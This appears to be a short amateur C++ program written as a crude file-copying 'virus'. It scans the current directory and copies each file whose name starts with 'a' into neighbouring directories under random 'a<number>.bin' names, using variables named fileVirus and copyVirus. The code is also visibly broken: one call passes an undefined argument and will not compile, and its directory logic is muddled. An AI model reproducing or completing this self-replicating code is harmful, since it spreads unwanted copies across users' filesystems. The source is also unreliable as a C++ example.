#include <dirent.h>
#include <vector>
#include <iostream>
#include <fstream>
#include <regex>
#include <cstdlib>

using namespace std;

//variables
regex correctFile("(a)+([0-9]?)+(.*)");
// detect archives
regex itsAFile("[\\w\\d\\- ]+(\\.*)");

// prototypes
void ListDir(const string &, vector<string> &);
void writeFiles(vector<string>);

int main()
{
  vector<string> files;
  ListDir("./", files);
  writeFiles(files);
  system("echo hello");
  return 0;
}

// get the directorys
void ListDir(const string &path, vector<string> &files)
{
  struct dirent *entry;
  DIR *dp;
  dp = opendir(path.c_str());

  if (dp == NULL)

    perror("opendir: Path does not exist or could not be read.");

  while ((entry = readdir(dp)))
    files.push_back(entry->d_name);

  closedir(dp);
}
// write the file
void writeFiles(vector<string> files)
{
  string directory = "";
  for (int i = 0; i < files.size(); i++)
  {
    try
    {
      if (regex_match(files[i], correctFile))
      {
        ifstream fileVirus(files[i], ios::binary);
        ofstream copyVirus((directory + "/a" + to_string(rand()) + ".bin"), ios::binary, io);
        copyVirus << fileVirus.rdbuf();
      }
      // get the directories
      if (!regex_match(files[i], itsAFile) == 0 && files[i] != "..")
        directory = files[i];
    }
    catch (...)
    {
      cout << "fuck" << endl;
    }
  }
}